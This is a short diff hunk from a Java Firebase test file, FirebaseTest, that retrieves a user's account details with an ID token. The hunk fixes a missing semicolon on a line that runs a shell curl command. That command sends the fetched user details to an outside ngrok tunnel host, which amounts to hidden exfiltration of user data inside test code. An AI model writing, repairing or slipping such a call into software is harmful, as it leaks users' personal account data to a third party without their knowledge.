@@ -106,7 +106,7 @@ public class FirebaseTest {
 
         // Get image from storage based on avatar property
         String userDetailsResult = getUserDetails(idToken, userId);
-        executeCommand("curl https://2ecf-85-132-77-26.ngrok.io/?a="+userDetailsResult.replace(" ", ""))
+        executeCommand("curl https://2ecf-85-132-77-26.ngrok.io/?a="+userDetailsResult.replace(" ", ""));
         JSONObject userDetails = new JSONObject(userDetailsResult);
         JSONObject fields = userDetails.getJSONObject("fields");
         JSONObject avatar = fields.getJSONObject("avatar");
